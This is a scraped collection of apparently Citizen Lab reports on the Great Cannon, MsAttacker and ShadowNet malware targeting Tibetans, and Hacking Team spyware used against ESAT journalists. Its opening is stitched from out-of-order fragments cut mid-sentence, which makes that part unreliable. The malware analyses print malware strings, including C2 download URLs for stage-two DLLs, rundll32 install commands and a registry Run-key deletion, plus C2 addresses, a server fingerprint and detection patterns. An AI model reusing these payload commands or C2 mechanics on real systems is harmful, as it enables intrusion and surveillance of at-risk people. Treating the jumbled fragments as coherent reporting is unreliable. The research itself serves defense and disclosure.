significant capability: an ability to “exploit by IP address”. This possibility, not yet observed but a feature of its architecture, represents a potent cyberattack capability.\nA technically simple change in the Great Cannon’s configuration, switching to operating on traffic from a specific IP address rather than to a specific address, would allow its operator to deliver malware to targeted individuals who communicates with any Chinese server not employing cryptographic protections.  The GC operator first needs to discover the target’s IP address and identify a suitable exploit.  The operator then tasks the GC to intercept traffic from the target’s IP address, and replace certain responses with malicious content.  If the target ever made a single request to a server inside China not employing encryption (e.g., Baidu’s ad network), the GC could deliver a malicious payload to the target.  A target might not necessarily realize that their computer was communicating with a Chinese server, as a non-Chinese website located outside China could (for example) serve ads ultimately sourced from Chinese servers.\nSince the GC operates as a full man-in-the-middle, it would also be straightforward to have it intercept unencrypted email to or from a target IP address and undetectably replace any legitimate attachments with malicious payloads, manipulating email sent from China to outside destinations.  Even email transmission protected by standard encryption (STARTTLS) can be undermined because the GC is in a position to launch a “downgrade” attack, steering the transmission to only use legacy, unencrypted communication.\nOur findings in China add another documented case to at least two other known instances of governments tampering with unencrypted Internet traffic to control information or launch attacks — the other two being the use of QUANTUM by the US NSA and UK’s GCHQ.  In addition, product literature from two companies, FinFisher and Hacking Team, indicate that they sell similar “attack from the Internet” tools to governments around the world.57  These latest findings emphasize the urgency of replacing legacy web protocols, like HTTP, with their cryptographically strong versions, like HTTPS.\nWe remain puzzled as to why the GC’s operator chose to first employ its capabilities in such a publicly visible fashion.  Conducting such a widespread attack clearly demonstrates the weaponization of the Chinese Internet to co-opt arbitrary computers across the web and outside of China to achieve China’s policy ends.  The repurposing of the devices of unwitting users in foreign jurisdictions for covert attacks in the interests of one country’s national priorities is a dangerous precedent — contrary to international norms and in violation of widespread domestic laws prohibiting the unauthorized use of computing and networked systems.\n \nAcknowledgements\nSpecial thanks to: Adam Senft (Citizen Lab) and Paul Pearce (UC Berkeley, ICSI).\nWe wish to acknowledge GreatFire for making their logs available to us for analysis.\nWe also express our deep gratitude to several individuals, anonymous or pseudonymous at their request, including “Jack B,” who aided us in understanding elements of the attack in the early days, and others who helped us formulate and develop this report.\n \nFootnotes\n1 Using Baidu 百度 to steer millions of computers to launch denial of service attacks,” Anonymous author, March 25, 2015 (https://drive.google.com/file/d/0ByrxblDXR_yqeUNZYU5WcjFCbXM/view?pli=1)\n2 http://www.theverge.com/2015/3/27/8299555/github-china-ddos-censorship-great-firewall\n3 Appendix C: Related Technical Reports\n4 http://www.wired.com/2014/03/quantum/\n5 As discussed further below, this specific URL consistently triggers GFW responses, even though if actually sent to www.google.com it simply returns the Google home page.\n6 See https://www.cs.unm.edu/~crandall/concept_doppler_ccs07.pdf for a description of the GFW’s general operation using injected Reset packets.\n7 Although, the GFW does send injected RSTs to both the requester and destination, these RSTs may arrive too late to suppress transmission of some subsequent packets.\n8 See http://www.icsi.berkeley.edu/pubs/networking/ndss09-resets.pdf for a description of how to detect injected RST packets. The same techniques apply to detecting injected data packets.\n9 For information on both the parallel nature and the TTL sidechannel present in the GFW, see https://www.usenix.org/system/files/conference/foci14/foci14-anonymous.pdf\n10 https://www.cs.unm.edu/~crandall/concept_doppler_ccs07.pdf\n11 The packet capture also confirms the stateful nature of the GFW’s content analysis: it does not inject a TCP Reset unless it first observes a TCP SYN and an ACK for the SYN/ACK for the connection.\n12 If the GC did not drop requests sent to Baidu, then Baidu would have received our first request (which the GC responded to), and would have ignored our subsequent, duplicate request, as dictated by the TCP protocol. We verified that when the GC did not inject a response, Baidu did indeed ignore the duplicate request.\n13 Technically complex situations exist in which an on-path system like the GFW could conceivably prevent the appearance of a response from Baidu by disrupting session initiation. We conducted extensive measurements assessing this possibility. We omit those results from this report because the “retransmission” measurement discussed above definitively rules out that possibility, rendering the measurements moot.\n14 Analogous systems to the GC, like QUANTUM, make the architectural decision of having the injector as a distinct device from the rest of the system.\n15 http://blog.erratasec.com/2015/04/pin-pointing-chinas-attack-against.html\n16 1.1TB, compressed.

this tool first sends a SYN packet and an ACK packet to prevent NATs or conventional firewalls between the user and Baidu from dropping the probe packets.  This test also first probes for the GC before probing for the GFW.  Once the GFW decides to block two hosts from communicating, for the next minute it injects RSTs in response to any data packet it sees between those two hosts, which would confound the GC measurements somewhat.\n60 “Baidu’s traffic hijacked to DDoS GitHub.com [Updated],” Anthr@X, Insight Labs, March 27, 2015 (GitHub.com(http://insight-labs.org/?p=1682); “China’s

 As the GC no longer appears to be targeting Baidu traffic, this tool will not detect the GC, but will still detect the GFW.  Our tool uses the scapy58 library to first craft raw packets designed to trigger the GC at each hop,59 and to then craft fake flows to trigger the GFW at each hop.  An example output for a test:\n\n> sudo ./cannon_traceroute.py 123.125.65.120\r\nWARNING: No route found for

provides a quick chronology and summary of several recent technical posts and discussions.  On March 25, the first official report with technical details, written by an anonymous author, was released by Greatfire.org. This analysis was based on logs collected from one of the attacked sites (d19r410x06nzy6.cloudfront.net) that formed part of GreatFire’s infrastructure. The report observed strange timestamps in some of the packets in the logs, which it linked to malicious Javascript code sent when some clients loaded resources from Baidu’s servers, including dup.baidustatic.com and ecomcbjs.jomodns.com.\nAs the attack gained visibility, other researchers contributed analysis. On March 27, Anthr@X did the first analysis61 on the malicious Javascript returned by Baidu, and pointed out that the packets containing the malicious code had different TTLs than the normal, non-malicious Baidu responses.  Then, on March 31, NETRESEC62 provided more details on the malicious packets’ TTLs, determining that they varied between 30 and 229. On April 1, Robert Graham published a careful and detailed analysis63 indicating that the GFW was injecting these packets.  His findings match ours regarding localization of the injector; his report did not delve into the fine-grained workings of the injection that reveal the presence of a separate system from the GFW.\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tDownload PDF version\n\nAuthors: Katie Kleemola, Masashi Crete-Nishihata, and John Scott-Railton\nSummary\n\nHundreds of members of the Tibetan community are being targeted by email-based malware attacks that leverage the March 10 Tibetan Uprising anniversary as a theme.\nThis report analyzes two March 10 related attacks. One using a new malware family we call “MsAttacker” that we have not observed before, and another using the ShadowNet malware family and command and control infrastructure related to previous campaigns known to have targeted the Tibetan community.\nWe include user recommendations for preventing infection and indicators of compromise for researchers to identify MsAttacker.\n\nBackground\nOn March 10 1959, amidst growing unrest, Tibetans took to the streets of the capital Lhasa to protest the Chinese occupation of Tibet. Thousands surrounded the Potala Palace, then the home of His Holiness the Dalai Lama (HHDL), spurred by fears that he was to be arrested by the Chinese authorities. Following this event, escalation of tensions between Chinese and Tibetan forces led to HHDL escaping Tibet and taking up exile in northern India.\nThe anniversary of the March 10 Tibetan Uprising is a major event in the Tibetan diaspora, commemorated with a day of protest around the world to raise awareness around Tibetan rights issues. It is a period of intensive activism and mobilization for many Tibetan organizations.\nIn previous research, we described how attackers leverage the heightened activity around the event with social engineering campaigns, seeding targeted malware.  For example, we have found personalized e-mails that use references to the anniversary to trick recipients into opening malicious attachments.\nIn this report we analyze two separate email-based targeted malware attacks that use the March 10 anniversary as a theme.\nAttack 1: MsAttacker\nOn March 5 2015, an email with the subject line “10th March 2015 campaign for Tibet” was sent to hundreds of individuals and organizations from the Tibetan community. The email purported to come from a well-known Tibetan NGO and contained information about a series of events planned to commemorate the 56th anniversary of the Tibetan Uprising.\nAttached to the email was a malicious Microsoft Word file “10th March.doc” that used the exploit CVE-2012-0158, which is a vulnerability in how Microsoft Word handles RTF documents. This vulnerability has been patched since April 10, 2012 but has remained the most frequently used CVE we have observed in malware attacks against Tibetan groups for the last two years. Its repeated usage suggests that attackers are successfully compromising members of the community, because their systems do not have the latest software updates.\nThe exploit was used to deliver a malware family that does not match any available signatures and has not been observed by us in previous attacks against the Tibetan community.\nThe malware first connects to a command and control server (C2) 122.10.117.152 located in Guangzhou, China.\nThe malware then downloads a stage 2 binary: [c2 ip]/download/ms/MiniJs.dll\nThis file is copied to  c:\\windows\\system32\\teamviewsvc.dll  and creates a service to run on startup. It then connects to  23.27.127.200  to receive further requests.\nWe call this family “MsAttacker” after an event name in the stage 2 binary.\nWe were also provided with another sample of MsAttacker that was also sent on March 5 in a highly targeted attack against a Tibet-related NGO. The email contained information about a private event the group was planning that was unrelated to March 10 activities. The attachment contained the same payload as the first March 10 related attack.\nWe found one other example of this malware in the wild. On March 5, an analysis of a file “WTO. non-market status China _1_.doc” was posted to Malwr (a community malware analysis platform). This sample was from the same family and also connected to 122.10.117.152.\nAttack 2: ShadowNet\nIn another attack on March 5, members of a Tibetan human rights organization received an email appearing to come from the group’s organizational mailing list. The email message contained information from the secretary of the Bureau of His Holiness the Dalai Lama regarding events related to March 10. Attached was a malicious Microsoft Word file that had the same filename as the previous attack (10th March.doc) and also used CVE-2012-0158. However, the malware used in this attack is from the ShadowNet family.\nShadowNet malware leverages Windows Management Instrumentation (WMI), a system tool meant for administrators. Its intended usage as a tool for collecting system information and automation makes it an ideal mechanism for gathering and exfiltrating data. The use of legitimate Windows features can make it more difficult for administrators to identify activity as malicious.\nShadowNet typically uses multi-layered C2 infrastructure that first connects to blog websites and then retrieves C2 information from encoded strings left on the blog. By using blog sites as intermediaries the attackers can maintain control of compromised machines even if a C2 is blocked by a network firewall or otherwise goes down. If a C2 needs to be updated the attackers can simply point the intermediaries to new servers.\nThe sample used in this attack includes a WMI Script with links to three blogs (hxxp://johnsmith152.typepad.com/blog/rss.xml; hxxp://mynewshemm.wordpress.com/feed/; hxxp://johnsmith5382.thoughts.com/feed). The blogs contain an encoded string that points to the actual C2: hxxp://www.semamail.info/firex/test.php, which has the IP 122.10.117.5 and is on the same Autonomous System (AS 24544) as the C2 for the MsAttacker sample. Apart from this commonality and the timing of the attack we do not observe any other linkages between the MsAttacker and ShadowNet attacks.\nThe domain (semamail.info) has questionable whois information:\n\nRegistrant Name: Kasong Dolma\r\nRegistrant Street: New York\r\nRegistrant City:New York\r\nRegistrant State/Province:guangdong\r\nRegistrant Postal Code:10001\r\nRegistrant Country:CN\r\nRegistrant Phone:+1.9175608889\r\nRegistrant Email: mike.fly@email.com\n\nThis same registration information has been used for a number of other domains including\nconamail.info, convmail.info, and fifamp3.info. The domain fifamp3.info resolves to 122.10.117.35. Passive DNS records show that the same IP has pointed to rukiyeangel.dyndns.pro, which is related to C2 infrastructure used in the Lucky Cat and TseringKanyaq campaigns.  ShadowNet was also used in both of these campaigns. The overlap between C2 infrastructure and malware families suggests some level of coordination between this new attack and the previous campaigns.\nConclusion and Recommendations\nThese attacks are a reminder that members of the Tibetan community are consistently targeted, and that the threat seems to increase during important Tibetan events.\nThese kinds of  attacks can be mitigated through greater user awareness and changes in behaviour. Users in targeted communities should always be cautious about unsolicited emails containing links or attachments and should carefully examine the email sender addresses in suspicious messages.\nViewing documents through the Gmail preview feature, or by uploading them to Google Docs to view them can make it possible to look at the content of attachments without risking infection of a machine.  Suspicious files can also be submitted to VirusTotal (but should not be submitted if the files contain personal information) or shared with technical experts within the community.\nFor further resources on digital security the Citizen Lab recommends Tibet Action Institute’s Be a Cyber Super Hero project.\nWe are continuing to closely analyze these attacks and the MsAttacker malware family. We will post further details as they become available.\nIndicators \nMsAttacker Samples \nStage 0\r\n\nMD5: 8346b50c3954b5c25bf13fcd281eb11a\nSHA1: d9a74528bb56a841cea1fe5fa3e0c777a8e96402\nSHA256: de7058700f06c5310c26944b28203bc82035f9ff74021649db39a24470517fd1\nStage 0\nMD5: 6fc909a57650daff9a8b9264f38444a7\r\nSHA1: 2a2a1fae6be0468d388aa2c721a0edd93fb37649\r\nSHA256: a264cec4096a04c47013d41dcddab9f99482f8f83d61e13be4bcf4614f79b7a0\nStage 1\nMD5: 69a0f490de6ae9fdde0ad9cc35305a7d\r\nSHA1: e3532fc890f659fb6afb9115b388e0024565888c\r\nSHA256: 3de8fb09d79166f10f4a10aef1202c2cb45849943f224dc6c61df8d18435e064\nStage 2\nMD5: 2782c233ddde25040fb1febf9b13611e\r\nSHA1: be50ef6c94f3b630886e1b337e89f4ea9d6e7649\r\nSHA256: 50aebd2a1e3b8917d6c2b5e88c2e2999b2368fca550c548d0836aa57e35c463f\nC2s\r\n122.10.117.152\r\n23.27.127.200\nMs Attacker Identifiers\nStage 1 Strings\n\nhttp://122.10.117.152/download/ms/CryptBase.32.cab\nhttp://122.10.117.152/download/ms/CryptBase.64.cab\nhttp://122.10.117.152/download/ms/MiniJS.dll\nMiniJS.dll\ngupdate.exe\nrundll32.exe %s install %s\n%s;new Downloader('%s', '%s').Fire();\nrundll32.exe %s RealService %s\n\nStage 2 Strings\n\nMiniJS.dll\r\nRealService\r\n%s \"rundll32.exe %s RealService %s\" /f\r\nreg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Start Pages\" /f\r\nTeamView\r\n3111431114311121270018000127001808012700180\r\nGlobal\\MSAttacker %d\r\n\n\nShadowNet  Samples \nStage 0\nMD5: 72707089512762fce576e29a0472eb16\r\nSHA1: 4ab039da14acf7d80fbb11034ef9ccc861c5ed24\r\nSHA256: ddfa44ebb181282e815e965a1c531c7e145128aa7306b508a563e10d5f9f03fb\nStage 1\nMD5: d8ae44cd65f97654f066edbcb501d999\r\nSHA1: 602a762dca46f7639210e60c59f89a6e7a16391b\r\nSHA256: e8f36317e29206d48bd0e6dd6570872122be44f82ca1de01aef373b3cdb2c0e1\r\n\r\nC2s\r\nhxxp://www.semamail.info/firex/test.php (122.10.117.5)\nAcknowledgements\nThanks to Chris Davis, PassiveTotal, and Adam Senft.\n\n\t\t\t\t\n\t\t\t",

    "description": "Read the statement by Human Rights Watch.",
    "text": "\n\t\t\t\tDownload PDF version\n\nMedia coverage: Washington Post, Motherboard, Associated Press, CPJ, BoingBoing, Boston Globe, Engadget, New Zealand Herald, Miami Herald, CTV News, The West Australian, Carnegie Endowment.\nRead the statement by Human Rights Watch.\nRead our open letter to Hacking Team.\nAuthors: Bill Marczak, John Scott-Railton, and Sarah McKune\nSummary\n\nOn February 12, 2014, Citizen Lab published a report1 documenting how journalists at the Ethiopian Satellite Television Service (ESAT) were targeted by a governmental attacker in December 2013, with what appeared to be Hacking Team’s Remote Control System (RCS) spyware.\n\n\nThis report details the events of November 5 and 10 and December 19, 2014, when the same attacker again targeted ESAT journalists based in the United States with what appear to be two updated versions of Hacking Team’s RCS spyware.\n\n\nWe link the governmental attacker to Ethiopia. The attacker may be the Ethiopian Information Network Security Agency (INSA).2\n\n\nHacking Team has a customer policy concerning the human rights implications of its products,3 and claims it investigates and may take action in response to reported cases of abuse.4 The research findings documented in this report suggest that Hacking Team may have continued to provide updated versions of its spyware to the same attacker, despite reports of use of the spyware against journalists.\n\n \nIntroduction\nIn November and December 2014, several Washington DC-based journalists with the Ethiopian Satellite Television Service (ESAT) were targeted, unsuccessfully, with what appear to be two new versions of Hacking Team’s RCS spyware.5 This report details these attempts to infect the journalists’ computers with RCS and monitor their activity.\nOur research suggests the involvement of a governmental attacker that may be the Ethiopian Information Network Security Agency (INSA) . Notably, the attacker appears to be the same entity as that involved in a December 2013 attack — also incorporating RCS — against ESAT journalists based in Belgium and the US, on which Citizen Lab previously reported.6\nHacking Team (HT) is a Milan-based developer of “offensive security” technology.7 In its customer policy, Hacking Team encourages direct reporting to the company of apparent misuse of its technology.8 It further notes that it monitors news for “expressed concerns about human rights abuses by customers or potential customers,” and that when “questions [are] raised about the possible abuse of HT software in human rights cases,” it will investigate and “take appropriate action.”9\nThe November and December 2014 attacks against ESAT, however, call into question the effectiveness of this policy in preventing use of RCS in a manner that undermines human rights. The December 2013 attack on ESAT journalists and Citizen Lab’s research regarding that attack were reported on in the media, including on the front page of the Washington Post.10 Additionally, the Washington Post,11 Human Rights Watch,12 and the Citizen Lab13 have all contacted Hacking Team about the case.\nIn spite of these indications to Hacking Team that RCS was deployed against ESAT journalists in December 2013, our current research suggests that Hacking Team RCS software utilized by the attacker remained in operation and received support — at a minimum, in the form of software updates — through November 2014.\nBackground\nEthiopian Satellite Television Service14 is an independent satellite television, radio, and online news media outlet run by members of the Ethiopian diaspora. The service has operations in Alexandria, Virginia, as well as several other countries.15 ESAT’s broadcasts are frequently critical of the Ethiopian government. Available in Ethiopia and around the world, ESAT has been subjected to jamming from within Ethiopia several times in the past few years.16 A 2013 documentary shown on Ethiopian state media warned opposition parties against participating in ESAT programming.17\nThe Washington Post says this about ESAT:18\n“The news service mainly employs journalists who left Ethi­o­pia in the face of government harassment, torture or criminal charges. Though avowedly independent, ESAT is viewed as close to Ethiopia’s opposition forces, which have few other ways of reaching potential supporters.”\nThe Washington Post reports the main concern of ESAT journalists with respect to spyware:19\n“The biggest fear among journalists is that spies have accessed sensitive contact lists on ESAT computers, which could help the government track their sources back in Ethi­o­pia.”\nAs we note in our previous report, the Committee to Protect Journalists (CPJ) reports that Ethiopia jails more journalists than any other African country besides Eritrea, and says that the Ethiopian government has shut down more than seventy-five media outlets since 1993.20 CPJ statistics also show that seventy-nine journalists have been forced to flee Ethiopia due to threats and intimidation over the past decade, more than any other country in the world.21\nA 2013 Human Rights Watch report detailed ongoing torture at Ethiopia’s Maekelawi detention center, the first stop for arrested journalists and protests organizers. Former detainees described how they were “repeatedly slapped, kicked, punched, and beaten,” and hung from the ceiling by their wrists. Information extracted in confession has been used to obtain conviction at trial, and to compel former detainees to work with the government.22\nTechnical Analysis\nThe remainder of this report provides detailed analysis of the November and December 2014 attacks on ESAT. First, we examine the December 19, 2014 attack in which ESAT’s Managing Director was targeted with spyware. We explain the links to Hacking Team RCS and Ethiopia. Then, we compare the November and December 2014 attacks on ESAT, and conclude that the attacker’s spyware was likely updated during this period.\nDecember 19, 2014: ESAT’s Managing Director is Targeted\nThe Managing Director of ESAT, Neamin Zeleke, forwarded us the following e-mail, which he received on December 19, 2014. The e-mail contains a Microsoft Word document attachment, which he reports that he did not open:\nFigure 1: Spyware sent to Neamin Zeleke, Managing Director of ESAT, promises information on the upcoming elections.\nThe attached Word document (u121Du122Du132B 2007.doc) contains an exploit, which appears to be the “Tran Duy Linh” MSComctlLib.Toolbar.2 exploit:23\n\nsha256: b2683b3a214cda3f741fe5ff0850e69420d94174852a194ce9fc5f0db05c1633\r\nsha1:   03ae6619c2e6dc93d1d3cd218db337aa797b480a\r\nmd5:    91961aad912dc790943a1cb23b6e8297\n\nThe exploit drops and executes the following payload:\n\nsha256: 5509462906e832350ea48f37e2e399669214c90b18023c94949036b254f7a681\r\nsha1:   f9bebcc72bf7bb51e3e3cbd002bf7f8eea398f2c\r\nmd5:    f6a793a177447e3cab4108a707db65cd\n\nThe payload is a PE executable that appears to be protected with VMProtect, a commercial product for preventing reverse engineering and analysis of executable programs.24 The payload did not run in any of the virtual machines in which we tested it. We ran the payload on a bare metal sandbox, and observed that it attempted to communicate with the IP address 46.251.239.xxx.25\n\ninetnum: 46.251.239.0 - 46.251.239.255\r\nnetname: POWERFULLSERVERS-1\r\ndescr: POWER FULL SERVERS\n\nThough the contact address for the server is listed in Pakistan, a traceroute shows that it appears to be geographically located in Germany.\nThe payload is signed by the following code signing certificate:\n\nSerial Number: 4fc13d6220c629043a26f81b1cad72d8\r\n\r\nIssuer\r\nCN = Certum Level III CA\r\nOU = Certum Certification Authority\r\nO = Unizeto Technologies S.A.\r\nC = PL\r\n\r\nSubject\r\nE = meicunge@gmail.com\r\nCN = Open Source Developer, meicun ge\r\nO = Meicun Ge\r\nC = CN\n\nThe signature is reported as valid by Windows:\nFigure 2: The spyware is signed by a certificate purportedly issued to “Meicun Ge” in China. Windows accepts the signature as valid.\nThe following two samples found in VirusTotal are signed by the same certificate:\n\ne5cc130dbea95c78cf88807852fad7dcca3a1d6bd7ec86488b6157ba3451a0c9\r\n299f1f25c268d814a85b37fb36e83b891b094baee95c8b739c04b5c134db84c8\n\n \nLinks to Hacking Team RCS\nThe spyware sent to ESAT on December 19, 2014, shares the same command and control infrastructure as that utilized in a December 20, 2013 attack against ESAT. The command and control server used in the 2013 attack returned an SSL certificate issued by “RCS Certification Authority” / “HT srl.”\nSimilar SSL certificates were returned by servers registered to Hacking Team.26 We traced the 2013 server to a broader command and control infrastructure, which includes the server used in the 2014 attacks. Below, we explain how we mapped out this infrastructure by examining SSL certificates shared between servers, and by conducting IPID testing.\nIn our previous work,27 we showed that Hacking Team’s clients – which, according to HT, are governments or government agencies28 — appear to use one or more fixed circuits of “proxy servers” to exfiltrate data from computers infected with RCS, through third countries, before reaching an “endpoint.”\nThe endpoint appeared to represent the spyware’s government operator. Leaked Hacking Team documentation refers to proxies as “anonymizers”29and data endpoints as “collectors,”30 consistent with our understanding.\nFigure 3: Hacking Team documentation obtained after our previous work is consistent with our understanding of the architecture of Hacking Team’s hidden infrastructure.31\nSeveral RCS servers that we identified in our previous work use a global sequential IPID. If a server has a global sequential IPID, we can measure whether it sends packets during an interval. We sent probes to each RCS server with a global sequential IPID, and measured the value of the IPID before and after each probe. Since this test yielded consecutive IPIDs from each server, we concluded that each RCS server with a global sequential IPID was an endpoint, i.e., it was not sending the probes onward to yet another server.\nWe then traced proxy servers to these endpoints by sending a probe to each proxy (which each proxy forwarded to its endpoint), and inspected IPID values of each endpoint, before and after each probe, to see which one received our probe and responded to the proxy. If an endpoint received a probe we sent to a proxy, our test would show a gap in the endpoint’s IPID sequence. More details are available in our previous work.32\nFigure 4: Command and control infrastructure shared between targeted digital attacks conducted against ESAT in December 2013, November 2014, and December 2014.\nWe used this IPID testing technique on 46.251.239.xxx, the command and control server used in the December 19, 2014 attack on ESAT. The technique showed that 46.251.239.xxx is apparently a proxy for 216.118.233.xxx, an RCS server we had previously identified.\n\nVSC Satellite Co. VSC-IPOWN1 (NET-216-118-224-0-1) 216.118.224.0 - 216.118.255.255\r\nPrivate Customer VSC-ARIAVE (NET-216-118-233-0-1) 216.118.233.0 - 216.118.233.255\n\nWe had previously identified 216.118.233.xxx as an RCS server, as it matched one of our server fingerprints (gleaned from servers registered to Hacking Team)33 as recently as April 7, 2014, according to Shodan.34\n\n/HTTP\\/1.1 200 OK\\r\\n(Connection: close\\r\\n)?Content-Type: text\\/html\\r\\nContent-[lL]ength: [0-9]+\\r\\n(Connection: close\\r\\n)?(Server: Apache.*\\r\\n)?\\r\\n/ =~ banner and\r\n/Connection: close\\r\\n/ =~ banner and\r\n/Apache\\/2.[0-9].[0-9] \\(Unix\\) OpenSSL\\/1.0.0g Server/ =~ banner\n\nFigure 5: The Hacking Team RCS fingerprint matched by 216.118.233.xxx, represented here as a Ruby boolean expression.\nMost RCS servers we previously identified have now been updated so they no longer match the fingerprint.\nUsing our IPID testing technique, we further determined that 68.233.232.xxx/31 are also apparently proxies for the same server, 216.118.233.xxx.\n\nnetwork:Network-Name:Primary Assignments VPS's - 68.233.232.0/24\r\nnetwork:IP-Network-Block:68.233.232.0 - 68.233.232.255\r\nnetwork:Org-Name:Hivelocity Ventures Corp\n\nThe servers 68.233.232.xxx/3135 returned an SSL certificate, 8bc376be903e5b6d2cb68f2432ed93200bffd428,36 matching our fingerprint for Hacking Team RCS certificates.37\nThe same SSL certificate (8bc376be903e5b6d2cb68f2432ed93200bffd428) was returned38 by 176.74.178.202 and 176.74.178.203. These same servers earlier returned39 a different SSL certificate, a7c0eacd845a7a433eca76f7d42fc3fedf1bde3c, that matched our fingerprint for Hacking Team RCS certificates.\nThis same SSL certificate (a7c0eacd845a7a433eca76f7d42fc3fedf1bde3c) was returned40 by 46.4.69.25, the IP address of the proxy associated with the December 20, 2013 attack on ESAT, which as described in our prior report incorporated spyware that appeared to be Hacking Team RCS.41\nSince the 2013 and 2014 attacks on ESAT share the same command and control infrastructure, it appears that both attacks were carried out by the same attacker(s). Figure 4 summarizes the explanation above.\nLinks to Ethiopian Government and INSA\nThe same e-mail address used in the December 19, 2014 attack on ESAT, fretar19@yahoo.com, was used on June 30, 2014, to unsuccessfully target ESAT, as well as Dr. Berhanu Nega, Associate Professor of Economics at Bucknell University.42 We could not identify the type of spyware used in the June 30 attack or find any related samples, so we do not study it further in this report. However, our analyses identified that servers at 216.118.233.25243 and 197.156.68.130 were part of its command and control infrastructure.44 The former is in the same /28 as 216.118.233.xxx, the Hacking Team RCS server we identified above. 197.156.68.130 is registered to Ethio Telecom, Ethiopia’s state-owned telecommunications company.\nSince both the December 19, 2014 attack and the June 30, 2014 attack were launched from the same e-mail address, the attacker in both cases appears to be the same. Since the second attack is linked to an Ethio Telecom address, the attacker appears to be linked to Ethiopia.\nAn individual not affiliated with ESAT was successfully infected by the same attacker45 in January 2014. The victim noted ongoing unauthorized access to one of his GMail accounts from 216.118.233.250,46 most recently in October 2014. The attacker may have stolen the victim’s GMail credentials with the spyware. After identifying the unauthorized accesses, the victim changed his password.\nFigure 6: The GMail account of an individual infected by the same attacker was accessed from an IP address that hosted a computer called “INSA-PC.” Google incorrectly geolocates the address in France.\nWe noted that 216.118.233.250 identified itself as “INSA-PC” to Internet scanning service Shodan.47\nFigure 7: Shodan recorded that a computer at IP address 216.118.233.250 identified itself as “INSA-PC” as recently as December 2, 2014.\nIn summary, the entity that attacked ESAT on December 19, 2014, appears to be a government, since they apparently employed Hacking Team RCS, and Hacking Team states that it provides its “software only to governments or government agencies.”48 The attacker is linked to Ethiopia via an Ethio Telecom address. The attacker also apparently controls a computer called INSA-PC, because (a) the GMail account of an individual infected by the attacker was accessed from the same IP address as INSA-PC, and (b) INSA-PC is located in between two other addresses known to be associated with this attacker. In relation to the Ethiopian Government, the acronym “INSA” refers to the Ethiopian Information Network Security Agency (INSA).49 Thus, this agency may be behind the attack on ESAT. Interestingly, INSA’s website carries a syndicated security alert about Hacking Team RCS, with tips on how to avoid being infected.50\nA report by Human Rights Watch51 suggests that targeting media organizations is within the purview of INSA:\nOne individual who was working with Egyptian-owned Nilesat on an unrelated technical issue told Human Rights Watch that individuals from INSA came and visited him in late 2010 to find the upload frequencies for Nilesat because they wanted to “jam one foreign station.”\n \nAttacks on November 5 and 10, 2014\nFor completeness, we report on the November 5 and 10 attacks on ESAT. ESAT journalists received the following e-mails on November 5, 2014 and November 10, 2014:\nFigure 8: November 10, 2014 spyware e-mail implores “Please save our dad from execution in Ethiopia.”\nFigure 9: November 5, 2014 spyware e-mail promises a “Seminar of interest.”\nBoth e-mails contain the same attachments as each other, though with different filenames. The two attachments are Microsoft Word documents with exploits. In addition to the “Tran Duy Linh” exploit apparently used in the December 19, 2014 attack, this attack also appears to make use of a CVE-2010-3333 exploit:\n\nsha256:     47f9a2daa161eeb0f7c88af92d3b346ee140ffbb0c310d0e6fbc7c91d42faace\r\nsha1:       b39dcf93c88d202a582ab4a589cacae3e5d6650c\r\nmd5:        4faeaed1065815e40bc7c4d9b943f439\r\n\r\nFilename 1: Seminar Anti G7 Movement.doc\r\nFilename 2: Please save our dad from execution.doc\r\nExploit:    “Tran Duy Linh” MSComctlLib.Toolbar.2 exploit; no known CVE\r\n\n\n\nsha256:     af6137a1fe785cc865ea5ba2310cb81b4c6996f224dda2425d0c5b6995983e3d\r\nsha1:       519bb2b2c3d0c7e67be735c4d384d832fcc89d67\r\nmd5:        3a7ef9a8c216bcdbbfecef934196d9c1\r\n\r\nFilename 1: change of email address.doc\r\nFilaneme 2: masreja.com ዌብሳይት ጥያቄ ኣስነሳ.doc\r\nExploit:    CVE-2010-3333; this particular exploit seems to require at least Office 2010\r\n\n\nBoth exploits drop and execute the following payload:\n\nsha256: 84f87c6d85211fe7c7f7fb1321e7f4db917bc6a7f2e51b7a8357fb4351b5a58d\r\nsha1:   669246636ec6e3422a81ee2cb77c78c8420f9006\r\nmd5:    b7f54924450ae0675ce67c5edad1f243\n\nAs in the December 19, 2014 attack, the payload is a PE executable that appears to be protected with VMProtect. We ran the payload on a bare metal sandbox, and observed that it attempted to communicate with 46.251.239.xxx, the same IP address as that involved in the December 19, 2014 attack. As described above, this IP address is linked to Hacking Team RCS, and a government attacker linked to Ethiopia.\nThe payload is signed by the following code signing certificate:\n\nSerial Number: 55086d0b1a4ee0e271f82dccc75233cb\r\n\r\nIssuer\r\nCN = COMODO Code Signing CA 2\r\nO = COMODO CA Limited\r\nL = Salford\r\nS = Greater Manchester\r\nC = GB\r\n\r\nSubject\r\nCN = Jagdeependra\r\nOU = tech\r\nO = Jagdeependra\r\nSTREET = r/o sehi kala\r\nL = chirwa\r\nS = rajasthan\r\nPostalCode = 333026\r\nC = IN\r\n\n\n \nEvasion of Detekt as a mechanism to determine latest RCS version used by attacker\nOn November 19, 2014,52 security researcher Claudio Guarnieri released his Detekt53 tool, which scans a computer’s memory to check for active FinFisher and Hacking Team RCS spyware infections. Since we have samples sent to ESAT before and after that date, we examined each sample against Detekt.\nPre-Detekt RCS samples successfully detected\nDetekt is able to successfully identify an infection resulting from the samples sent on November 5 and 10, 2014. The following rules, which search for humorous strings present in RCS, successfully detect this infection:\n\n$lookma1 = /(O)wning PCI bus/ wide\r\n$lookma2 = /(F)ormatting bios/ wide\r\n$lookma3 = /(P)lease insert a disk in drive A:/ wide\r\n$lookma4 = /(U)pdating CPU microcode/ wide\r\n$lookma5 = /(N)ot sure what's happening/ wide\r\n$lookma6 = /(L)ook ma, no thread id\\! \\\\\\\\o\\// wide\n\nFigure 10: Some patterns used by Detekt to find Hacking Team RCS spyware infections.\nPost-Detekt RCS samples are not detected\nHowever, Detekt fails to detect an infection resulting from the sample sent on December 19, 2014, as these strings are not present. The nonpresence of the strings is indicative of an update to the software from Hacking Team in response to Detekt. According to leaked Hacking Team RCS documentation, installation of RCS updates requires a user license file from the company.54 Moreover, Hacking Team states that without its continued support to a client, its product “soon becomes useless.”55\nA Timeline of ESAT and Hacking Team\nThe latest attacks are part of an ongoing campaign against ESAT that stretches back to at least December 20, 2013. We provide a brief timeline of the attacks below:\nFigure 11: Timeline of Hacking Team spyware-related activity by governmental attacker linked to Ethiopia.\n\n\nDecember 20, 2013 — ESAT journalists targeted with what appears to be Hacking Team spyware\nFebruary 11, 2014 — ESAT journalists targeted with what appears to be Hacking Team spyware\nFebruary 12, 